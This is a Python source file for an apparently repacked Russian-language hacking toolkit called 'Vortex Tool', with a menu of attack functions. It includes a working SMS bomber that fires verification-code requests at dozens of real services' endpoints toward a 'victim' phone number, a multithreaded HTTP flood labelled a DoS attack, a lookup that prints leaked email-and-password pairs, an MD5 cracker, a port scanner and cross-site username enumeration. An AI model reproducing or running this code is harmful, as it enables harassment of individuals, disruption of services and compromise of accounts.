#BY @peregodasoru
#BY @peregodasoru
#BY @peregodasoru
import os
import configparser
from pystyle import Colors, Write, Colorate, Center, Anime
import ctypes
import requests
import socket
import time
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
import random
from faker import Faker
import threading
import sys
import urllib.request
import json
import socket
from concurrent.futures import ThreadPoolExecutor
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib

API_URL = "https://api.proxynova.com/comb"
LIMIT = 100
platforms_list = ['twitter', 'instagram', 'facebook', 'telegram', 'youtube', 'reddit', 'roblox', 'vkontakte']


def proxy_give():
    proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxy_list = response.text.strip().split("\r\n")
            Write.Print("Список прокси:\n", Colors.green, interval=0.01)
            for proxy in proxy_list:
                Write.Print(f"{proxy}\n", Colors.green, interval=0.01)
        else:
            Write.Print(f"Не удалось получить список прокси. Код статуса: {response.status_code}\n", Colors.red,interval=0.01)
    except Exception as e:
        Write.Print(f"Ошибка при получении списка прокси: {e}\n", Colors.red, interval=0.01)

def discord_lookup():
    token = Write.Input("Введите токен Discord бота: ", Colors.green, interval=0.01).strip()
    user_id = Write.Input("Введите ID пользователя Discord: ", Colors.green, interval=0.01).strip()

    url = f"https://discord.com/api/v10/users/{user_id}"
    headers = {
        "Authorization": f"Bot {token}"
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            user_info = response.json()
            username = user_info.get("username")
            discriminator = user_info.get("discriminator")
            Write.Print(f"Пользователь найден: {username}#{discriminator}\n", Colors.green, interval=0.01)
        elif response.status_code == 404:
            Write.Print("Пользователь не найден.\n", Colors.red, interval=0.01)
        else:
            Write.Print(f"Ошибка {response.status_code}: {response.text}\n", Colors.yellow, interval=0.01)
    except Exception as e:
        Write.Print(f"Ошибка: {str(e)}\n", Colors.red, interval=0.01)

def hash_cracker():
    hash_to_crack = Write.Input("Введите хэш MD5 для взлома: ", Colors.green, interval=0.01).strip()
    wordlist_path = "passwords.txt"

    try:
        with open(wordlist_path, "r", encoding="utf-8") as file:
            Write.Print(f"Начинаем подбор для хэша: {hash_to_crack}\n", Colors.blue, interval=0.01)

            for word in file:
                word = word.strip()
                md5_hash = hashlib.md5(word.encode('utf-8')).hexdigest()

                if md5_hash == hash_to_crack:
                    Write.Print(f"Пароль найден: {word}\n", Colors.green, interval=0.01)
                    return

            Write.Print("Пароль не найден в словаре.\n", Colors.red, interval=0.01)

    except FileNotFoundError:
        Write.Print("Файл 'passwords.txt' не найден. Убедитесь, что он находится в той же папке.\n", Colors.red, interval=0.01)
    except Exception as e:
        Write.Print(f"Ошибка: {str(e)}\n", Colors.yellow, interval=0.01)

def port_scan(ip_address, port_range):
    open_ports = []
    failed_ports = []

    class PortScanner:
        def __init__(self, ip, port_range):
            self.ip = ip
            self.port_range = port_range

        def scan(self):
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(self.scan_port, port): port for port in range(1, self.port_range + 1)}
                for future in as_completed(futures):
                    result = future.result()
                    if result is not None:
                        open_ports.append(result)

        def scan_port(self, port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(0.5)
                    sock.connect((self.ip, port))
                    return port
            except (socket.timeout, ConnectionRefusedError, socket.error):
                failed_ports.append(port)
                return None

    scanner = PortScanner(ip_address, port_range)
    scanner.scan()

    Write.Print("Открытые порты:\n", Colors.green, interval=0.01)
    for port in open_ports:
        Write.Print(f"Порт {port} открыт\n", Colors.green, interval=0.01)

    Write.Print("\nНеудачные порты:\n", Colors.red, interval=0.01)
    for port in failed_ports:
        Write.Print(f"Порт {port} закрыт\n", Colors.red, interval=0.01)

def check_username():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    platforms_list = [
        'twitter', 'instagram', 'facebook', 'telegram', 'youtube',
        'reddit', 'roblox', 'vkontakte', 'tiktok', 'pinterest',
        'github', 'twitch', 'linkedin', 'snapchat',
        'flickr', 'vimeo', 'mixcloud', 'slideshare', 'imgur',
        'pastebin', 'keybase', 'creativemarket', 'ello',
        'cashme', 'dribbble', 'angel', 'tripadvisor', '500px',
        'blogspot', 'deviantart', 'slack', 'hackerone', 'etsy',
        'hubpages', 'steam', 'codementor', 'newgrounds',
        'okcupid', 'reverbnation', 'plusgoogle', 'houzz',
        'bitbucket', 'zoneh', 'codecademy', 'lastfm', 'trakt',
        'tumblr', 'wordpress', 'disqus', 'spotify', 'wattpad',
        'oldreddit', 'gumroad', 'badoo', 'ifttt', 'contently',
        'skyscanner', 'wikipedia', 'gravatar', 'designspiration',
        'buzzfeed', 'behance', 'bandcamp', 'instructables',
        'scribd', 'foursquare', 'blip', 'medium', 'soundcloud',
        'livejournal', 'patreon', 'dailymotion', 'goodreads',
        'canva', 'flipboard', 'aboutme', 'colourlovers'
    ]
    urls = {
        "twitter": "https://twitter.com/{username}",
        "instagram": "https://www.instagram.com/{username}",
        "facebook": "https://www.facebook.com/{username}",
        "telegram": "https://t.me/{username}",
        "youtube": "https://www.youtube.com/{username}",
        "reddit": "https://www.reddit.com/user/{username}",
        "roblox": "https://www.roblox.com/users/{username}/profile",
        "vkontakte": "https://vk.com/{username}",
        "tiktok": "https://www.tiktok.com/@{username}",
        "pinterest": "https://www.pinterest.com/{username}",
        "github": "https://github.com/{username}",
        "twitch": "https://www.twitch.tv/{username}",
        "linkedin": "https://www.linkedin.com/in/{username}",
        "snapchat": "https://www.snapchat.com/add/{username}",
        "flickr": "https://flickr.com/people/{username}",
        "vimeo": "https://vimeo.com/{username}",
        "mixcloud": "https://mixcloud.com/{username}",
        "slideshare": "https://slideshare.net/{username}",
        "imgur": "https://imgur.com/user/{username}",
        "pastebin": "https://pastebin.com/u/{username}",
        "keybase": "https://keybase.io/{username}",
        "creativemarket": "https://creativemarket.com/{username}",
        "ello": "https://ello.co/{username}",
        "cashme": "https://cash.me/{username}",
        "dribbble": "https://dribbble.com/{username}",
        "angel": "https://angel.co/{username}",
        "tripadvisor": "https://tripadvisor.com/members/{username}",
        "500px": "https://500px.com/{username}",
        "blogspot": "https://{username}.blogspot.com/",
        "deviantart": "https://{username}.deviantart.com/",
        "slack": "https://{username}.slack.com/",
        "hackerone": "https://hackerone.com/{username}",
        "etsy": "https://www.etsy.com/shop/{username}",
        "hubpages": "https://{username}.hubpages.com",
        "steam": "https://steamcommunity.com/id/{username}",
        "codementor": "https://www.codementor.io/{username}",
        "newgrounds": "https://{username}.newgrounds.com/",
        "okcupid": "https://www.okcupid.com/profile/{username}",
        "reverbnation": "https://www.reverbnation.com/{username}",
        "plusgoogle": "https://plus.google.com/{username}",
        "houzz": "https://houzz.com/user/{username}",
        "bitbucket": "https://bitbucket.org/{username}",
        "zoneh": "http://www.zone-h.org/archive/notifier={username}",
        "codecademy": "https://codecademy.com/{username}",
        "lastfm": "https://last.fm/user/{username}",
        "trakt": "https://www.trakt.tv/users/{username}",
        "tumblr": "https://{username}.tumblr.com/",
        "wordpress": "https://{username}.wordpress.com/",
        "disqus": "https://disqus.com/{username}",
        "spotify": "https://open.spotify.com/user/{username}",
        "wattpad": "https://wattpad.com/user/{username}",
        "oldreddit": "http://old.reddit.com/user/{username}",
        "gumroad": "https://www.gumroad.com/{username}",
        "badoo": "https://badoo.com/en/{username}",
        "ifttt": "https://www.ifttt.com/p/{username}",
        "contently": "https://{username}.contently.com",
        "skyscanner": "https://www.trip.skyscanner.com/user/{username}",
        "wikipedia": "https://www.wikipedia.org/wiki/User:{username}",
        "gravatar": "https://en.gravatar.com/{username}",
        "designspiration": "https://www.designspiration.net/{username}",
        "buzzfeed": "https://buzzfeed.com/{username}",
        "behance": "https://www.behance.net/{username}",
        "bandcamp": "https://www.bandcamp.com/{username}",
        "instructables": "https://www.instructables.com/member/{username}",
        "scribd": "https://www.scribd.com/{username}",
        "foursquare": "https://foursquare.com/{username}",
        "blip": "https://blip.fm/{username}",
        "medium": "https://medium.com/@{username}",
        "soundcloud": "https://soundcloud.com/{username}",
        "livejournal": "https://{username}.livejournal.com/",
        "patreon": "https://www.patreon.com/{username}",
        "dailymotion": "https://www.dailymotion.com/{username}",
        "goodreads": "https://www.goodreads.com/{username}",
        "canva": "https://canva.com/{username}",
        "flipboard": "https://flipboard.com/@{username}",
        "aboutme": "https://about.me/{username}",
        "colourlovers": "https://www.colourlovers.com/love/{username}"
    }
    username = Write.Input("Введите юзернейм для проверки: ", Colors.green, interval=0.01)
    for platform in platforms_list:
        try:
            url = urls.get(platform).format(username=username)
            response = requests.get(url, headers=headers, timeout=0.5)
            if response.status_code == 200:
                Write.Print(f"{platform.capitalize()}: {url} - Пользователь найден.\n", Colors.green, interval=0.01)
            elif response.status_code == 404:
                Write.Print(f"{platform.capitalize()}: {url} - Пользователь не найден.\n", Colors.red, interval=0.01)
            else:
                Write.Print(f"{platform.capitalize()}: {url} - Ошибка {response.status_code}.\n", Colors.yellow, interval=0.01)
        except Exception as e:
            Write.Print(f"{platform.capitalize()}: Пропуск из-за ошибки.\n", Colors.blue, interval=0.01)
def ip():
    ip = input(f'{COLOR_CODE["GREEN"]}[+]Введите айпи: ')
    try:
        ip = socket.gethostbyname(ip)
        infoList1 = requests.get(f"http://ipwho.is/{ip}")
        infoList = infoList1.json()
        if infoList.get("success"):
            print(f'''{COLOR_CODE["GREEN"]}
          Айпи адресс:   {infoList["ip"]}
          Успех:         {infoList["success"]}
          Тип:           {infoList["type"]}
          Континент:     {infoList["continent"]}
          Страна:        {infoList["country"]}
          Регион:        {infoList["region"]}
          Город:         {infoList["city"]}
          Почтовый код:  {infoList["postal"]}
          Столица:       {infoList["capital"]}
    ''')
        else:
            print(f'''{COLOR_CODE["GREEN"]}
          IP:           {infoList["ip"]}
          Success:      {infoList["success"]}
          Message:      {infoList["message"]}
    ''')
    except Exception as e:
        print(f'{COLOR_CODE["GREEN"]}Произошла ошибка: {e}')


def generate_random_headers():
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15'
        ]),
        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.9', 'ru-RU,ru;q=0.9', 'fr-FR,fr;q=0.9']),
        'Referer': random.choice(['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/']),
        'Connection': 'keep-alive',
        'Accept': '*/*'
    }
    return headers
def dos(link, duration):
    end_time = time.time() + duration * 60
    while time.time() < end_time:
        try:
            requests.get(link, headers=generate_random_headers())
        except requests.exceptions.RequestException:
            pass
def show_progress_bar(duration):
    start_time = time.time()
    end_time = start_time + duration * 60
    while time.time() < end_time:
        elapsed_time = time.time() - start_time
        progress = elapsed_time / (duration * 60)
        bar_length = 50
        filled_length = int(bar_length * progress)
        bar = COLOR_CODE["GREEN"] + '█' * filled_length + '-' * (bar_length - filled_length) + COLOR_CODE["RESET"]
        percent = int(progress * 100)
        sys.stdout.write(f'\r[{bar}] {percent}% осталось')
        sys.stdout.flush()
        time.sleep(1)
    Write.Print("\nАтака завершена.", Colors.green, interval=0.01)
    Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
def main():
    link = Write.Input('Введите ссылку: ', Colors.green, interval=0.01)
    duration = int(Write.Input('Сколько минут производить атаку: ', Colors.green, interval=0.01))
    threads = int(Write.Input('Введите количество потоков для атаки: ', Colors.green, interval=0.01))
    Write.Print(f'Запуск атаки на {duration} минут...', Colors.green, interval=0.01)
    for _ in range(threads):
        threading.Thread(target=dos, args=(link, duration)).start()
    show_progress_bar(duration)

def make_request(url):
    response = requests.get(url)
    print(response.status_code)

def get_proxies(url):
    proxies = []
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    table = soup.find('table')
    rows = table.findAll('tr')
    for row in rows[1:]:
        cols = row.findAll('td')
        ip = cols[0].text.strip()
        port = cols[1].text.strip()
        protocol = cols[4].text.strip().lower()
        proxies.append(f'[+] {ip}:{port}')
    return proxies

def fetch_data(query):
    try:
        response = requests.get(f"{API_URL}?query={query}&start=0&limit={LIMIT}", allow_redirects=False)
        if response.status_code in {301, 302}:
            return [f"[ERROR] Переадресация обнаружена (HTTP {response.status_code})"]
        response.raise_for_status()
        data = response.json()
        return data.get("lines", ["[SORRY] Нет результатов."])
    except requests.RequestException as e:
        return [f"[ERROR]Ошибка при запросе: {e}"]
def format_results(results):
    formatted_results = []
    for item in results:
        if ":" in item:
            email, password = item.split(":", 1)
            formatted_results.append(f"[+] Почта: {email.strip()}\n[+] Пароль: {password.strip()}")
        else:
            formatted_results.append(item)
    return "\n\n".join(formatted_results)

def bombing():
    heads = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
    ]
    HEADERS = random.choice(heads)
    global phone
    global name
    global iteration
    if phone[0] == '+':
        phone = phone[1:]
    if phone[0] == '8':
        phone = '7' + phone[1:]
    if phone[0] == '9':
        phone = '7' + phone
    for x in range(12):
        name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    phone_plus = '+' + phone
    phone8 = '8' + phone[1:]
    email = name+f'{iteration}'+'@gmail.com'
    email = name+f'{iteration}'+'@gmail.com'
    try:
        requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone}, headers=HEADERS)
        print('SunLight: отправлено')
    except:
        print('SunLight: не отправлено')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": phone_plus, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
        print('iCloud: отправлено')
    except:
        print('iCloud: не отправлено')

    try:
        requests.post('https://b.utair.ru/api/v1/login/', data = {'login':phone8}, headers=HEADERS)
        print('Utair: отправлено')
    except:
        print('Utair: не отправлено')

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":phone}, headers=HEADERS)
        print('Tinder: отправлено')
    except:
        print('Tinder: не отправлено')

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": phone_plus}, headers=HEADERS)
        print('Одноклассники: отправлено')
    except:
        print('Одноклассники: не отправлено')

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":phone}, headers=HEADERS)
        print('Карусель: отправлено')
    except:
        print('Карусель: не отправлено')

    try:
        requests.post('https://youdrive.today/login/web/phone', data = {'phone': phone9, 'phone_code': '7'},headers=HEADERS)
        print('YouDrive: отправлено')
    except:
        print('YouDrive: не отправлено')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers=HEADERS)
        print('MTS TV: отправлено')
    except:
        print('MTS TV: не отправлено')

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone_plus}, headers=HEADERS)
        print('Юла: отправлено')
    except:
        print('Юла: не отправлено')

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone}, headers=HEADERS)
        print('Яндекс.Еда: не отправлено')
    except:
        print('Яндекс.Еда: не отправлено')

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": phone}, headers=HEADERS)
        print('IVI: отправлено')
    except:
        print('IVI: не отправлено')

    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=HEADERS)
        print('DeliTime: отправлено')
    except:
        print('DeliTime: не отправлено')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
        print('ICQ: отправлено')
    except:
        print('ICQ: не отправлено')

    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        print('Grabaxi: отправлено')
    except:
        print('GrabTaxi: не отправлено')

    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()['res']
        print('RuTaxi: отправлено')
    except:
        print('RuTaxi: не отправлено')

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': phone_plus}, headers={})
        print('Tinkoff: отправлено')
    except:
        print('Tinkoff: не отправлено')

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone})
        print('Работа: отправлено')
    except:
        print('Работа: не отправлено')

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': phone_plus})
        print('Rutube: отправлено')
    except:
        print('Rutube: не отправлено')

    try:
        requests.post('https://www.smsinti.ru/bitrix/templates/sms_intiel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
        print('Smsinti: отправлено')
    except:
        print('Smsinti: не отправлено')

    try:
        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone9 + '&country_code=%2B7&nod=4&locale=en')
        print('Oyorooms: отправлено')
    except:
        print('Oyorooms: не отправлено')

    try:
        requests.post('https://www.mvideo.ru/intiernal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
        print('Мвидео: отправлено')
    except:
        print('Мвидео: не отправлено')

    try:
        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        print('Newnext: отправлено')
    except:
        print('Newnext: не отправлено')

    try:
        requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
        print('Invitro: отправлено')
    except:
        print('Invitro: не отправлено')

    try:
        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        print('Psbank: отправлено')
    except:
        print('PSbank: не отправлено')

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        print('Beltelcom: отправлено')
    except:
        print('Beltelcom: не отправлено')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        print('KFC: отправлено')
    except:
        print('KFC: не отправлено')

    try:
        requests.post('https://api.carsmile.com/',json={'operationName': 'enterPhone', 'variables': {'phone': phone},'query': 'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'})
        print('Carsmile: отправлено')
    except:
        print('Carsmile: не отправлено')

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
        print('Citilink: отправлено')
    except:
        print('CitiLink: не отправлено')

    try:
        requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru',data={'mode': 'request', 'phone': '+' + phone,'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6','osversion': 'unknown', 'devicemodel': 'unknown'})
        print('InDriver: отправлено')
    except:
        print('Indriver: не отправлено')

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '+' + phone, 'api': 2, 'email': 'email','x-email': 'x-email'})
        print('Mail.ru: отправлено')
    except:
        print('Mail.ru: не отправлено')

    try:
        requests.post('https://plink.tech/register/',json={'phone': phone})
        print('Plink: отправлено')
    except:
        print('Plink: не отправлено')

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": phone}, headers=HEADERS)
        print('Qlean: отправлено')
    except:
        print('Qlean: не отправлено')

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('Twitch: отправлено')
    except:
        print('Twitch: не отправлено')

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': phone})
        print('DeliveryClub: отправлено')
    except:
        print('DeliveryClub: не отправлено')

while True:
    os.system('cls' if os.name == 'nt' else 'clear')
    for _ in range(4):
        print()
    COLOR_CODE = {
        "GREEN": "\033[32m",
        "BOLD": "\033[01m",
        "RESET": "\033[0m",
    }
    intro = """

 ▄█    █▄   ▄██████▄     ▄████████     ███        ▄████████ ▀████    ▐████▀ 
███    ███ ███    ███   ███    ███ ▀█████████▄   ███    ███   ███▌   ████▀  
███    ███ ███    ███   ███    ███    ▀███▀▀██   ███    █▀     ███  ▐███    
███    ███ ███    ███  ▄███▄▄▄▄██▀     ███   ▀  ▄███▄▄▄        ▀███▄███▀    
███    ███ ███    ███ ▀▀███▀▀▀▀▀       ███     ▀▀███▀▀▀        ████▀██▄     
███    ███ ███    ███ ▀███████████     ███       ███    █▄    ▐███  ▀███    
███    ███ ███    ███   ███    ███     ███       ███    ███  ▄███     ███▄  
 ▀██████▀   ▀██████▀    ███    ███    ▄████▀     ██████████ ████       ███▄ 
                        ███    ███      
        Welcome to the Vortex Tool_repack! Press "Enter" to continue.
    Telegram repacker : t.me/asoruperehod Telegram owner: t.me/Vortex_Join
    """

    Anime.Fade(Center.Center(intro), Colors.black_to_green, Colorate.Vertical, interval=0.045, enter=True)
    banner = '''

                                         ▄█    █▄   ▄██████▄     ▄████████     ███        ▄████████ ▀████    ▐████▀ 
                                        ███    ███ ███    ███   ███    ███ ▀█████████▄   ███    ███   ███▌   ████▀  
                                        ███    ███ ███    ███   ███    ███    ▀███▀▀██   ███    █▀     ███  ▐███    
                                        ███    ███ ███    ███  ▄███▄▄▄▄██▀     ███   ▀  ▄███▄▄▄        ▀███▄███▀    
                                        ███    ███ ███    ███ ▀▀███▀▀▀▀▀       ███     ▀▀███▀▀▀        ████▀██▄     
                                        ███    ███ ███    ███ ▀███████████     ███       ███    █▄    ▐███  ▀███    
                                        ███    ███ ███    ███   ███    ███     ███       ███    ███  ▄███     ███▄  
                                         ▀██████▀   ▀██████▀    ███    ███    ▄████▀     ██████████ ████       ███▄ 
                                                                ███    ███                                          
                                                                
                                        ┌─────────────────────────────────────────────────────────────────────────┐
                                        │  Telegram: @Vortex_Join // Repack: @asoruperehod // Owner: vortex_owner │
                                        ├────────────────────────────────┬──────────┬─────────────────────────────┤
                                        │   Version: 2.0_repack          │   Меню   │               [ PREMIUM ]   │
                                        ├────────────────────────────────┴──────────┴─────────────────────────────┤
                                        │[1] Универсальный Поиск                  [6] Поиск по юзернейму          │
                                        │[2] СМС Бомбер                           [7] Сканнер портов              │
                                        │[3] Пробив по MAC                        [8] Хэш крякер                  │
                                        │[4] DoS атака                            [9] Пробив по Discord           │
                                        │[5] Пробить IP                           [10] Получить прокси            │
                                        └───────────────────────────────────────────────────────┬─────────────────┤
                                                                                                │ [99] Выйти      │
                                                                                                └─────────────────┘
     '''
    print(Colorate.Horizontal(Colors.green_to_yellow, banner))
    prompt_text = f'{COLOR_CODE["GREEN"]}                                                                  [?]{COLOR_CODE["GREEN"]} Выбрать ~'
    final_prompt = f"{prompt_text}{COLOR_CODE['GREEN']} > {COLOR_CODE['RESET']}"
    select = input(final_prompt)
    if select == "1":
        query = Write.Input("[+] Введите номер -> ", Colors.green, interval=0.01)
        results = fetch_data(query)
        formatted_results = format_results(results)
        Write.Print("""[+] Результаты поиска:
""", Colors.green)
        Write.Print(formatted_results, Colors.green, interval=0.01)
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == "2":
        global phone
        global name
        global iteration
        iteration = 0
        name = ''
        phone = Write.Input('Номер жертвы: ', Colors.green, interval=0.01)
        count = Write.Input('Количество циклов (0 - бесконечно): ', Colors.green, interval=0.01)
        count = int(count)
        Write.Print('Предупреждение! Некоторые сервисы научились предотвращать их использование в "таких" целях.', Colors.green, interval=0.01)

        if count == 0:
            while True:
                bombing()
                iteration += 1
                Write.Print(iteration, ' круг пройден.', Colors.green, interval=0.001)
        else:
            for i in range(count):
                bombing()
                iteration += 1
                Write.Print(iteration, ' круг пройден.', Colors.green, interval=0.001)
            Write.Print('Спам окончен', Colors.green, interval=0.01)
            Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == "3":
        def mac_lookup(mac_address):
            api_url = f"https://api.macvendors.com/{mac_address}"
            try:
                response = requests.get(api_url)
                if response.status_code == 200:
                    return response.text.strip()
                else:
                    return f"Error: {response.status_code} - {response.text}"
            except Exception as e:
                return f"Error: {str(e)}"
        mac_address = Write.Input("[+] Введите Mac-Address -> ", Colors.green,interval=0.005)
        vendor = mac_lookup(mac_address)
        Write.Print(f"[+] Vendor: {vendor}", Colors.green, interval=0.005)
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == "4":
        main()
    elif select == "5":
        ip()
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == "6":
        check_username()
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == "7":
        ip_address = Write.Input("Введите IP-адрес для сканирования: ", Colors.green, interval=0.01).strip()
        port_range = int(Write.Input("Введите диапазон портов для сканирования: ", Colors.green, interval=0.01).strip())
        port_scan(ip_address, port_range)
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == '8':
        hash_cracker()
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == "9":
        discord_lookup()
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == '10':
        proxy_give()
        Write.Input("""
[+] Нажмите Enter чтобы продолжить.....""", Colors.green, interval=0.01)
    elif select == '99':
        exit()
#BY @peregodasoru
#BY @peregodasoru
#BY @peregodasoru